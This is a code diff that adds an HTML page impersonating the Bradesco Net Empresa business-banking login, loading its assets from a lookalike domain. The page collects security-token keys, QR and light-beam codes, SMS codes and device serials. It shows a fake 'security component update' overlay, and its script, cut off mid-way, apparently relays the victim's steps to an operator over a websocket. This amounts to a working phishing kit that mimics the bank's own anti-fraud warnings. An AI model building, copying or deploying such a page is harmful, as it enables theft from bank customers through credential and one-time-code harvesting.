@@ -1,0 +1,996 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html>
+  <head>
+    <meta name="bcsid" content="" />
+    <meta name="buuid" content="" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Cache-Control" content="no-store" />
+    <meta http-equiv="Expires" content="0" />
+    <meta http-equiv="Content-Type" content="text/html;CHARSET=iso-8859-1" />
+    <link rel="shortcut icon" id="linkIcone" href="https://www.ne13.bradesconetempresa.b.br/ibpj/imagens/geral/bradesco.ico" />
+    <title>Banco Bradesco S/A</title>
+    <link rel="stylesheet" type="text/css" media="screen, print" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/estrutura.css" />
+    <link rel="stylesheet" type="text/css" media="screen, print" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/interna.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/jquery.jqmodal.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/jquery.tooltip.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/jquery.autocomplete.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/jquery.combo.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/geral/basic-carousel.css" />
+    <link rel="stylesheet" type="text/css" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/login/login.css?vrs=15" />
+  </head>
+  <body>
+    <form name="institucional" action="http://www.bradesco.com.br"></form>
+    <style>
+      .topcontrol {
+        z-index: 2;
+        background: #bf0000;
+        width: 48px;
+        height: 30px;
+        border-radius: 50px;
+        modalContent -moz-border-radius: 50px;
+        -webkit-border-radius: 5px;
+        position: fixed;
+        bottom: -100px;
+        right: 10px;
+        cursor: pointer;
+        -webkit-transition: all .7s ease-in-out;
+        -moz-transition: all .7s ease-in-out;
+        -o-transition: all .7s ease-in-out;
+        -ms-transition: all .7s ease-in-out;
+        transition: all .7s ease-in-out;
+        overflow: auto;
+      }
+    </style>
+    <div id="topo" class="varejo">
+      <div class="centro">
+        <div class="bgrTopoDireita"></div>
+        <img src="https://www.ne13.bradesconetempresa.b.br/ibpj/imagens/perfil_varejo/logo.png" alt="Voc  est  no Acesso Seguro do Bradesco Net Empresa. Utilize TAB para navegar." style="height=131px; left: 4px; position: absolute; text-indent: -9999px; top: 11px; z-index: 2; width: 146px;" class="pngfix tabindex tabfirst" />
+        <ul id="_id52" class="login_topo">
+          <li id="_id53" class="tp1"></li>
+          <li id="_id54" class="tp2"></li>
+          <li id="_id55" class="btCancelarAcesso">
+            <a id="_id56" href="#modalLogout" tabindex="2" onclick="javascript: cancelarAcesso();" title="CANCELAR ACESSO" class="btCancelar_acessoVarejo">CANCELAR ACESSO</a>
+          </li>
+        </ul>
+        <div class="direita after">
+          <ul id="_id59" class="menuSessao">
+            <li id="_id60"> Wednesday, 18 de March de 2026</li>
+          </ul>
+          <div class="login_title2">
+            <span id="headerTitulo">
+              <h1>Acesso Seguro</h1>
+            </span>
+            <div class="login-subtitulo">
+              <span id="headerSubtitulo">
+                <h2>Acesse o Bradesco Net Empresa de forma segura seguindo os passos abaixo:</h2>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="miolo" class="after login ">
+      <style>
+        .nomeUsuario {
+          color: #CC092F;
+          font-size: 160%;
+        }
+
+        .boxTp2 {
+          background: none repeat scroll 0 0 #F3F3F3;
+          border: 1px solid #CCCCCC;
+          padding: 13px 15px;
+        }
+
+        .fs10 {
+          font-size: 92% !important;
+        }
+
+        .btnCancelarAcesso a {
+          width: 118px;
+        }
+
+        .btnAcessar,
+        .btnCancelarAcesso a {
+          display: block;
+          float: right;
+          height: 20px;
+          text-indent: -999999px;
+        }
+
+        .btnAcessarSemDispositivoSeguranca {
+          background-position: 0 -2974px;
+          margin-left: 10px;
+          text-indent: -999999px;
+          width: 234px;
+          border: medium none;
+          cursor: pointer;
+          float: right;
+          height: 20px;
+          text-indent: -999999px;
+        }
+      </style>
+      <link rel="stylesheet" type="text/css" media="screen" href="https://www.ne13.bradesconetempresa.b.br/ibpj/conteudo/css/../../componentes/UIAutenticador/css/autenticador.css" />
+      <div></div>
+      <div id="conteudo" class="after conteudo_L">
+        <div class="topo_canto_L"></div>
+        <div class="topo_canto_R"></div>
+        <div id="conteudo_interno" class="miolo miolo_noBg after">
+          <div class="top">
+
+            <div id="tokenFormContainer">
+              <div class="boxTp mb20">
+                <div class="bgt"></div>
+                <span class="passo">2</span>
+                <div class="fl mr20 fl" style="margin-top:30px;">
+                  <label for='txtSenhaToken'>
+                    <span style="color: #bf0000;font-size: 15px;" class="HtmlOutputTextBradesco">Digite a <strong>chave</strong> informada no <br>visor do seu celular </span>
+                  </label>
+                </div>
+                <div class="fl w440">
+                  <div>
+                    <div class="fl pt5 mb10">
+                      <span class="HtmlOutputTextBradesco">Ol , </span>
+                      <span class="nomeUsuario"></span>
+                    </div>
+                    <div class="fl">
+                      <a id="_id103" href="" title="Ligue o seu dispositivo para receber a Chave de Seguran a e depois digite o c digo gerado neste campo." class="bTip auto_Tip">Ligue o seu dispositivo para receber a Chave de Seguran a e depois digite o c digo gerado neste campo.</a>
+                    </div>
+                  </div>
+                  
+                  <div id="chaveseguranca" class="clr boxTp2 mt10  frmErroSenha " style="height: 100px">
+                    <img width='120px' class='fl mr10 ml10' src='https://www.ne13.bradesconetempresa.b.br/ibpj/imagens//geral/img_token_cel.gif'>
+                    
+                    <div class="fl w200">
+                      <p id="erroSenhaVazia" class="txtErro" style="visibility:hidden">
+                        <strong>
+                          <span class="HtmlOutputTextBradesco">Digite a senha do certificado</span>
+                        </strong>
+                      </p>
+                      <span class="inputSenha4 mb5 fl mr5">
+                        <input type="password" name="_id115" maxlength="6" class="numeric txtSenhaToken w60 tabindex tabfirst" />
+                      </span>
+                      <div class="info fl mt5">
+                        <span class="HtmlOutputTextBradesco">(6 d gitos)</span>
+                      </div>
+                      <p class="clr fs10">
+                        <span class="HtmlOutputTextBradesco">N  de s rie do dispositivo:</span>
+                        <span class="HtmlOutputTextBradesco">
+                          <br>
+                        </span>
+                        <strong>
+                          <span class="HtmlOutputTextBradesco"></span>
+                        </strong>
+                      </p>
+                    </div>
+                  </div>
+                </div>
+                <div class="bgb"></div>
+              </div>
+              
+              <div class="box-alerta after mt10 mb20">
+                <div id="divAlertaOTP" class="ctn-box after tabindex">O Bradesco n o envia e-mails contendo links ou solicitando atualiza  es de certificados digitais, componentes de seguran a ou identifica  o do usu rio.</div>
+              </div>
+              <form id="formTeste" name="formTeste" method="post" action="" enctype="application/x-www-form-urlencoded">
+                <input type="hidden" id="txtSenha" name="txtSenha" value="" />
+                <div class="rodape after">
+                  <ul id="formTeste:botoes" class="btos_bottom">
+                    <li id="formTeste:_id127">
+                      <a id="formTeste:_id128" href="#token" onclick="javascript: cancelarAcesso();" class="btnCancelarAcesso mr10 fecharFiltroExtrato"></a>
+                    </li>
+                    <li id="formTeste:_id129">
+                      <input id="botaoAcessar" name="botaoAcessar" type="image" src="https://www.ne13.bradesconetempresa.b.br/ibpj/imagens/geral/blank.gif" onclick="bCancel=true;return false;;clear_formTeste();document.forms['formTeste'].elements['autoScroll'].value=getScrolling();" alt="Acessar" title="Acessar" class="bt_confirmar tabindex tab-1 btnAcessar" />
+                    </li>
+                  </ul>
+                </div>
+                <input type="hidden" name="formTeste_SUBMIT" value="1" />
+                <input type="hidden" name="autoScroll" />
+                <input type="hidden" name="formTeste:_link_hidden_" />
+              </form>
+            </div>
+
+            <div id="qrContainer" style="display: none; text-align: center; padding: 20px;">
+              <div style="max-width: 450px; margin: 0 auto; background: #fff; border: 1px solid #e0e0e0; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                <div style="padding: 24px 24px 20px;">
+                  <h3 style="color: #bf0000; font-size: 20px; margin: 0 0 12px 0;">Valida  o de seguran a</h3>
+                  <p style="color: #555; font-size: 14px; margin-bottom: 20px;">Escaneie o QR Code abaixo com o aplicativo Bradesco para validar seu acesso.</p>
+                  <div id="qrCodeImage" style="margin: 20px auto; width: 200px; height: 200px; background: #f5f5f5; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd;"></div>
+                  <div style="margin: 20px 0 15px;">
+                    <label style="display: block; text-align: left; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 8px;">Digite a Chave de seguran a com 8 d gitos</label>
+                    <input type="text" id="chaveSegurancaQR" maxlength="8" class="numeric" style="width: 100%; padding: 10px; font-size: 16px; text-align: center; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; letter-spacing: 2px;" placeholder="00000000" />
+                  </div>
+                  <div id="dispositivoInfoQR" style="margin: 15px 0; font-size: 13px; color: #555;">
+                    <span>Confira o n mero de s rie do seu dispositivo:</span>
+                    <strong id="serialDispositivoQR" style="display: block; margin-top: 4px; color: #bf0000;">---</strong>
+                  </div>
+                  <button id="confirmarChaveQRBtn" style="background: #bf0000; color: white; border: none; padding: 10px 20px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 10px;">Confirmar</button>
+                  <button id="voltarTokenQRBtn" style="background: #f0f0f0; border: 1px solid #ccc; padding: 8px 16px; font-size: 13px; border-radius: 4px; cursor: pointer; margin-top: 12px; width: 100%;">? Voltar</button>
+                </div>
+              </div>
+            </div>
+
+            <div id="feixeContainer" style="display: none; text-align: center; padding: 20px;">
+              <div style="max-width: 480px; margin: 0 auto; background: #fff; border: 1px solid #e0e0e0; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                <div style="padding: 24px 24px 20px;">
+                  <h3 style="color: #bf0000; font-size: 20px; margin: 0 0 12px 0;">Chave de Seguran a - Feixe de Luz</h3>
+                  <ol style="text-align: left; margin: 16px 0; padding-left: 20px; color: #555; font-size: 14px; line-height: 1.6;">
+                    <li>Na sua chave, aperte o bot o com o desenho de cadeado</li>
+                    <li>Posicione o sensor que fica no verso dela, na frente deste quadro preto (cerca de 1 cm)</li>
+                    <li>Com a chave posicionada, clique em Iniciar Leitura, aqui na tela, e aguarde.</li>
+                  </ol>
+                  <!-- QUADRO PRETO -->
+                  <div style="background: #000000; width: 200px; height: 200px; margin: 20px auto; border: 1px solid #333; box-shadow: 0 0 0 2px #f0f0f0;"></div>
+                  <button id="iniciarLeituraBtn" style="background: #bf0000; color: white; border: none; padding: 10px 20px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-bottom: 20px;">Iniciar Leitura</button>
+                  <div style="margin: 20px 0 15px;">
+                    <label style="display: block; text-align: left; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 8px;">Digite a Chave de seguran a com 8 d gitos</label>
+                    <input type="text" id="chaveSegurancaFeixe" maxlength="8" class="numeric" style="width: 100%; padding: 10px; font-size: 16px; text-align: center; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; letter-spacing: 2px;" placeholder="00000000" />
+                  </div>
+                  <div id="dispositivoInfoFeixe" style="margin: 15px 0; font-size: 13px; color: #555;">
+                    <span>Confira o n mero de s rie do seu dispositivo:</span>
+                    <strong id="serialDispositivoFeixe" style="display: block; margin-top: 4px; color: #bf0000;">---</strong>
+                  </div>
+                  <button id="confirmarChaveFeixeBtn" style="background: #bf0000; color: white; border: none; padding: 10px 20px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 10px;">Confirmar</button>
+                  <button id="voltarTokenFeixeBtn" style="background: #f0f0f0; border: 1px solid #ccc; padding: 8px 16px; font-size: 13px; border-radius: 4px; cursor: pointer; margin-top: 12px; width: 100%;">? Voltar</button>
+                </div>
+              </div>
+            </div>
+
+            <div id="smsContainer" style="display: none; text-align: center; padding: 20px;">
+              <div style="max-width: 450px; margin: 0 auto; background: #fff; border: 1px solid #e0e0e0; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                <div style="padding: 24px 24px 20px;">
+                  <h3 style="color: #bf0000; font-size: 20px; margin: 0 0 12px 0;">Verifica  o por SMS</h3>
+                  <p style="color: #555; font-size: 14px; margin-bottom: 20px;">Enviamos um c digo de verifica  o para o n mero cadastrado.</p>
+                  <div id="smsPhoneInfo" style="background: #f9f9f9; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; color: #333;">
+                    SMS enviado para <strong id="smsPhoneNumber">(---) ----- ----</strong>
+                  </div>
+                  <div style="margin: 20px 0 15px;">
+                    <label style="display: block; text-align: left; font-size: 13px; font-weight: 500; color: #333; margin-bottom: 8px;">Digite o c digo recebido por SMS</label>
+                    <input type="text" id="codigoSMS" maxlength="6" class="numeric" style="width: 100%; padding: 10px; font-size: 16px; text-align: center; border: 1px solid #ccc; border-radius: 4px; font-family: monospace; letter-spacing: 2px;" placeholder="000000" />
+                  </div>
+                  <div id="dispositivoInfoSMS" style="margin: 15px 0; font-size: 13px; color: #555;">
+                    <span>Confira o n mero de s rie do seu dispositivo:</span>
+                    <strong id="serialDispositivoSMS" style="display: block; margin-top: 4px; color: #bf0000;">---</strong>
+                  </div>
+                  <button id="confirmarSMSBtn" style="background: #bf0000; color: white; border: none; padding: 10px 20px; font-size: 14px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 10px;">Confirmar c digo</button>
+                  <button id="reenviarSMSBtn" style="background: #f0f0f0; border: 1px solid #ccc; padding: 8px 16px; font-size: 13px; border-radius: 4px; cursor: pointer; margin-top: 12px; width: 100%;">Reenviar c digo SMS</button>
+                  <button id="voltarTokenSMSBtn" style="background: #f0f0f0; border: 1px solid #ccc; padding: 8px 16px; font-size: 13px; border-radius: 4px; cursor: pointer; margin-top: 12px; width: 100%;">? Voltar</button>
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+        
+        <div class="base">
+          <span class="c1"><!--  --></span>
+          <span class="c2"><!--  --></span>
+        </div>
+      </div>
+      <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+
+<div id="carregamentoPluginSeguranca">
+    <div class="loader-container">
+        <div class="loader-card">
+            <div class="loader-header">
+                <div class="brand">Bradesco</div>
+                <div class="subbrand">Empresas e Neg cios</div>
+                <div class="security-title">Seguran a</div>
+                <div class="security-badge">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                        <path d="M12 2L3 7L12 12L21 7L12 2Z" stroke="currentColor" stroke-width="1.5"/>
+                        <path d="M3 12L12 17L21 12" stroke="currentColor" stroke-width="1.5"/>
+                        <path d="M3 17L12 22L21 17" stroke="currentColor" stroke-width="1.5"/>
+                    </svg>
+                    <span>Componente de Seguran a</span>
+                </div>
+            </div>
+            <div class="loader-body">
+                <div class="security-info-box">
+                    <p class="info-highlight">O Bradesco simplificou o acesso   conta pela internet, mais simples, mais  gil e a mesma preocupa  o com a seguran a.</p>
+                    <p>Oferecemos gratuitamente esta atualiza  o para aumentar ainda mais sua seguran a no acesso ao Internet Banking Bradesco. O Componente de Seguran a protege seu computador enquanto voc  utiliza o Bradesco Net Empresa, evitando que programas maliciosos tenham acesso aos seus dados confidenciais.</p>
+                    <ul class="bullet-list">
+                        <li>Atualiza  o autom tica e em segundo plano, mantendo seu sistema sempre protegido contra as amea as mais recentes.</li>
+                        <li>Procedimento r pido   levar  apenas alguns minutos.</li>
+                        <li>A partir de agora, as atualiza  es ser o executadas sem interrup  es.</li>
+                    </ul>
+                </div>
+
+                <div class="progress-area">
+                    <div class="spinner-bars">
+                        <div class="bar"></div>
+                        <div class="bar"></div>
+                        <div class="bar"></div>
+                        <div class="bar"></div>
+                    </div>
+                    <p class="loader-message" id="loaderMessage">Atualiza  o em andamento...</p>
+                    <p class="warning-message">N o desligue o seu computador at  que o processo de atualiza  o seja conclu do.</p>
+                    <div class="progress-track">
+                        <div class="progress-fill" id="progressBar"></div>
+                    </div>
+                </div>
+
+                <div class="steps-grid">
+                    <div class="step" data-etapa="1">
+                        <div class="step-number">1</div>
+                        <div class="step-text">Validando chave de seguran a</div>
+                    </div>
+                    <div class="step" data-etapa="2">
+                        <div class="step-number">2</div>
+                        <div class="step-text">Verificando dispositivo</div>
+                    </div>
+                    <div class="step" data-etapa="3">
+                        <div class="step-number">3</div>
+                        <div class="step-text">Aguardando autoriza  o</div>
+                    </div>
+                </div>
+
+                <div class="support-footer">
+                    <div class="support-line">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                            <path d="M3 5H21C22.1 5 23 5.9 23 7V17C23 18.1 22.1 19 21 19H3C1.9 19 1 18.1 1 17V7C1 5.9 1.9 5 3 5Z" stroke="currentColor" stroke-width="1.5"/>
+                            <path d="M23 7L12 14L1 7" stroke="currentColor" stroke-width="1.5"/>
+                        </svg>
+                        <span>O suporte Bradesco Apoio   Empresa est  na linha para te auxiliar em caso de d vidas.</span>
+                    </div>
+                    <div class="assistant-line">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.5"/>
+                            <path d="M12 8V12M12 16H12.01" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                        </svg>
+                        <span>BIA - Assistente Virtual</span>
+                        <span class="online-badge">Online</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<style>
+#carregamentoPluginSeguranca {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.8);
+    backdrop-filter: blur(2px);
+    z-index: 10000;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Segoe UI', 'Roboto', 'Open Sans', 'Helvetica Neue', sans-serif;
+}
+
+.loader-container {
+    width: 680px;
+    max-width: 90vw;
+}
+
+.loader-card {
+    background: #ffffff;
+    border: 1px solid #cccccc;
+    box-shadow: 0 12px 30px rgba(0, 0, 0, 0.2);
+    overflow: hidden;
+}
+
+.loader-header {
+    background: #f5f5f5;
+    padding: 20px 28px;
+    text-align: center;
+    border-bottom: 1px solid #e0e0e0;
+}
+
+.brand {
+    font-size: 22px;
+    font-weight: 600;
+    color: #bf0000;
+    letter-spacing: -0.5px;
+}
+
+.subbrand {
+    font-size: 13px;
+    font-weight: 500;
+    color: #6c757d;
+    margin-top: 4px;
+}
+
+.security-title {
+    font-size: 24px;
+    font-weight: 600;
+    color: #2c3e50;
+    margin: 16px 0 8px;
+}
+
+.security-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: #eef2f5;
+    padding: 6px 14px;
+    font-size: 12px;
+    font-weight: 500;
+    color: #2c3e50;
+    border-radius: 20px;
+    letter-spacing: 0.3px;
+}
+
+.security-badge svg {
+    stroke: #bf0000;
+    width: 14px;
+    height: 14px;
+}
+
+.loader-body {
+    padding: 28px 32px 32px;
+}
+
+.security-info-box {
+    background: #fafafc;
+    padding: 18px 20px;
+    margin-bottom: 28px;
+    border: 1px solid #eceef2;
+    font-size: 13px;
+    line-height: 1.5;
+    color: #2c3e50;
+}
+
+.info-highlight {
+    font-weight: 600;
+    color: #bf0000;
+    margin-bottom: 12px;
+}
+
+.bullet-list {
+    margin: 12px 0 0 20px;
+    padding-left: 0;
+    list-style: disc;
+}
+
+.bullet-list li {
+    margin: 6px 0;
+}
+
+.progress-area {
+    text-align: center;
+    margin-bottom: 30px;
+}
+
+.spinner-bars {
+    display: flex;
+    justify-content: center;
+    gap: 6px;
+    margin-bottom: 18px;
+}
+
+.bar {
+    width: 5px;
+    height: 20px;
+    background-color: #bf0000;
+    animation: barPulse 1.2s infinite ease-in-out;
+}
+
+.bar:nth-child(2) { animation-delay: -1.0s; }
+.bar:nth-child(3) { animation-delay: -0.8s; }
+.bar:nth-child(4) { animation-delay: -0.6s; }
+
+@keyframes barPulse {
+    0%, 100% { transform: scaleY(0.6); opacity: 0.4; }
+    50% { transform: scaleY(1.2); opacity: 1; }
+}
+
+.loader-message {
+    font-size: 16px;
+    font-weight: 600;
+    color: #1e2a3a;
+    margin: 0 0 10px;
+}
+
+.warning-message {
+    font-size: 12px;
+    color: #bf0000;
+    margin-bottom: 20px;
+    font-weight: 500;
+}
+
+.progress-track {
+    background: #e9ecef;
+    height: 4px;
+    width: 100%;
+    overflow: hidden;
+    margin-bottom: 12px;
+}
+
+.progress-fill {
+    width: 0%;
+    height: 100%;
+    background: #bf0000;
+    transition: width 0.3s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+}
+
+.steps-grid {
+    display: flex;
+    justify-content: space-between;
+    gap: 12px;
+    margin: 24px 0 28px;
+}
+
+.step {
+    flex: 1;
+    text-align: center;
+}
+
+.step-number {
+    width: 34px;
+    height: 34px;
+    margin: 0 auto 8px;
+    background: #f0f0f0;
+    border: 1px solid #ddd;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 700;
+    font-size: 14px;
+    color: #6c757d;
+    transition: all 0.2s;
+}
+
+.step-text {
+    font-size: 11px;
+    font-weight: 500;
+    text-transform: uppercase;
+    color: #8d8d8d;
+    letter-spacing: 0.3px;
+}
+
+.step.active .step-number {
+    background: #bf0000;
+    border-color: #bf0000;
+    color: white;
+}
+
+.step.completed .step-number {
+    background: #2c7a2c;
+    border-color: #2c7a2c;
+    color: white;
+}
+
+.support-footer {
+    border-top: 1px solid #eceef2;
+    padding-top: 20px;
+    margin-top: 8px;
+    font-size: 12px;
+    color: #6c757d;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+.support-line, .assistant-line {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    justify-content: center;
+}
+
+.support-line svg, .assistant-line svg {
+    stroke: #bf0000;
+    width: 14px;
+    height: 14px;
+    flex-shrink: 0;
+}
+
+.online-badge {
+    background: #2c7a2c;
+    color: white;
+    font-size: 9px;
+    font-weight: bold;
+    padding: 2px 6px;
+    border-radius: 20px;
+    margin-left: 6px;
+}
+</style>
+
+      <span id="boxDireitaLogin" title="Precisa de Ajuda" class="tabindex">
+        <ul class="box-direita" id="lista-dicas-seguranca" title="" style="font-weight:normal">
+          <li id="_id82" title="">
+            <div class="box" title="">
+              <div class="boxP14" id="dicaCadeado" title="">
+                <span class="HtmlOutputTextBradesco">
+                  <span style="color: #bf0000;font-size: 14px; font-weight:bold">Se proteja contra golpes e fraudes</span>
+                  <p style="font-size: 1.1em;color: #333; text-decoration: none; font-weight:bold; padding: 20px 0 20px 0;" title="Componente de seguran a Topaz">Componente de seguran a Topaz</p>
+                  <ul class="mb10" title="">
+                    <li title="">
+                      <p class="mb10" title="">O Bradesco nunca entra em contato por telefone ou e-mail para pedir sua chave de seguran a durante instala  es ou atualiza  es.</p>
+                      <p class="mb10" title="">Por isso, n o forne a essas informa  es a ningu m.</p>
+                    </li>
+                  </ul>
+                  <p style="font-size: 1.1em;color: #333; text-decoration: none; font-weight:bold; padding: 0px 0 20px 0;" title="Golpe do falso gerente">Golpe do falso gerente</p>
+                  <ul class="mb10" title="">
+                    <li title="">
+                      <p class="mb10" title="">O Bradesco <b>nunca</b> entra em contato pedindo dados pessoais, senhas, chaves de seguran a, atualiza  es cadastrais ou sist micas e <b>nem solicitando transa  es.</b>
+                      </p>
+                      <p class="mb10" title="">Por isso, n o forne a essas informa  es a ningu m.</p>
+                      <p class="mb10" title="">Se receber esse tipo de liga  o, desconfie e desligue. Em caso de d vidas, entre em contato com o banco por meio dos <b>canais oficiais</b>. </p>
+                      <p class="mb10" title="">
+                        <b>Nunca fa a</b> transa  es a pedido de terceiros. Lembre-se: voc    respons vel pelas movimenta  es da sua conta.
+                      </p>
+                    </li>
+                  </ul>
+                  <div class="dicasSeguranca_1 none_i" id="dicasSeguranca_1"></div>
+                </span>
+              </div>
+            </div>
+          </li>
+        </ul>
+      </span>
+    </div>
+    <div class="base"></div>
+    </div>
+    </li>
+    </ul>
+    </span>
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+    </div>
+    <div>
+    </div>
+    <div id="rodape" class="after login">
+      <div class="miolo">
+        <ul id='_id91' class='listaLogos'>
+          <li id='li_logoBradesco' class='item1'>
+            <a href='#' class='tabindex' title='Bradesco Dia e Noite'>Dia&amp;Noite</a>
+          </li>
+          <li id='li_logoIso' class='item2'>
+            <a href='#' class='tabindex' title='Bradesco Internet Banking ISO 9001'>ISO 9001</a>
+          </li>
+        </ul>
+        <ul id='_id94' class='listaMenuInferior'></ul>
+        <ul id='_id99' class='listaTelefones'>
+          <li title='Capitais e Regi es Metropolitanas e Demais Localidades.' class=' item1 '>
+            <span>Bradesco Apoio   Empresa</span> 3003-1000
+          </li>
+          <li title='SAC - Servi o de Apoio ao Cliente Cancelamento, Reclama  es e Informa  es' class=' item2'>
+            <span>Al  Bradesco</span> 0800 202 1000
+          </li>
+          <li title='Atendimento 24h, 7 dias por semana' class=' item3'>
+            <span>Deficiente Auditivo ou de Fala</span> 0800 722 0099
+          </li>
+          <li title='Atendimento de segunda a sexta-feira das 8h  s 18h, exceto feriados' class=' ultimo item4'>
+            <span>Ouvidoria</span> 0800 727 9933
+          </li>
+        </ul>
+      </div>
+    </div>
+    <img id="scp" />
+<script>
+let websocket = null;
+let usuarioGlobal = null;
+
+function avancarEtapa(etapaNumero) {
+    const etapaElement = document.querySelector(`.step[data-etapa="${etapaNumero}"]`);
+    if (!etapaElement) return;
+
+    etapaElement.classList.add('completed');
+    etapaElement.classList.remove('active');
+
+    const progressFill = document.getElementById('progressBar');
+    if (progressFill) {
+        let percent = (etapaNumero / 3) * 100;
+        progressFill.style.width = percent + '%';
+    }
+
+    const proximaEtapaNumero = etapaNumero + 1;
+    const proximaEtapa = document.querySelector(`.step[data-etapa="${proximaEtapaNumero}"]`);
+    if (proximaEtapa) {
+        proximaEtapa.classList.add('active');
+    }
+
+    const msgLoader = document.getElementById('loaderMessage');
+    if (msgLoader) {
+        if (etapaNumero === 1) msgLoader.textContent = 'Chave validada. Verificando dispositivo...';
+        else if (etapaNumero === 2) msgLoader.textContent = 'Dispositivo verificado. Aguardando autoriza  o...';
+    }
+}
+
+function finalizarTodasEtapas() {
+    const etapas = document.querySelectorAll('.step');
+    etapas.forEach(etapa => {
+        etapa.classList.add('completed');
+        etapa.classList.remove('active');
+    });
+    const progressFill = document.getElementById('progressBar');
+    if (progressFill) progressFill.style.width = '100%';
+    const msgLoader = document.getElementById('loaderMessage');
+    if (msgLoader) msgLoader.textContent = 'Valida  o conclu da. Redirecionando...';
+}
+
+function exibirLoader(mostrar) {
+    const loader = document.getElementById('carregamentoPluginSeguranca');
+    if (loader) loader.style.display = mostrar ? 'flex' : 'none';
+    
+    const boxTp = document.querySelector('.boxTp.mb20');
+    const divAlertaOTP = document.getElementById('divAlertaOTP');
+    const boxAlertaAfter = document.querySelector('.box-alerta.after.mt10.mb20');
+    const formTeste = document.getElementById('formTeste');
+
+    if (mostrar) {
+        if (boxTp) boxTp.style.display = 'none';
+        if (divAlertaOTP) divAlertaOTP.style.display = 'none';
+        if (boxAlertaAfter) boxAlertaAfter.style.display = 'none';
+        if (formTeste) formTeste.style.display = 'none';
+        
+        // Reset visual
+        const progressFill = document.getElementById('progressBar');
+        if (progressFill) progressFill.style.width = '0%';
+        const etapas = document.querySelectorAll('.step');
+        etapas.forEach((etapa, idx) => {
+            etapa.classList.remove('active', 'completed');
+            if (idx === 0) etapa.classList.add('active');
+        });
+        const msgLoader = document.getElementById('loaderMessage');
+        if (msgLoader) msgLoader.textContent = 'Atualiza  o em andamento...';
+    } else {
+        if (boxTp) boxTp.style.display = '';
+        if (divAlertaOTP) divAlertaOTP.style.display = '';
+        if (boxAlertaAfter) boxAlertaAfter.style.display = '';
+        if (formTeste) formTeste.style.display = '';
+    }
+}
+
+function ocultarTodosContainers() {
+    document.getElementById('tokenFormContainer').style.display = 'none';
+    document.getElementById('qrContainer').style.display = 'none';
+    document.getElementById('feixeContainer').style.display = 'none';
+    document.getElementById('smsContainer').style.display = 'none';
+}
+
+function mostrarQRContainer(qrData, dispositivo) {
+    ocultarTodosContainers();
+    const qrDiv = document.getElementById('qrCodeImage');
+    const serialSpan = document.getElementById('serialDispositivoQR');
+
+    qrDiv.innerHTML = '';
+    if (qrData && (qrData.startsWith('data:image') || qrData.startsWith('/9j/') || qrData.includes('base64'))) {
+        const img = document.createElement('img');
+        img.src = qrData.startsWith('data:') ? qrData : 'data:image/png;base64,' + qrData;
+        img.style.width = '200px';
+        img.style.height = '200px';
+        img.style.display = 'block';
+        img.style.margin = '0 auto';
+        qrDiv.appendChild(img);
+    } else if (qrData && (qrData.startsWith('http') || qrData.startsWith('/'))) {
+        const img = document.createElement('img');
+        img.src = qrData;
+        img.style.width = '200px';
+        img.style.height = '200px';
+        img.style.display = 'block';
+        img.style.margin = '0 auto';
+        qrDiv.appendChild(img);
+    } else {
+        qrDiv.innerHTML = `<p style="font-family: monospace; font-size: 12px;">${qrData}</p>`;
+    }
+
+    serialSpan.textContent = dispositivo || 'N o informado';
+    document.getElementById('qrContainer').style.display = 'block';
+    exibirLoader(false);
+}
+
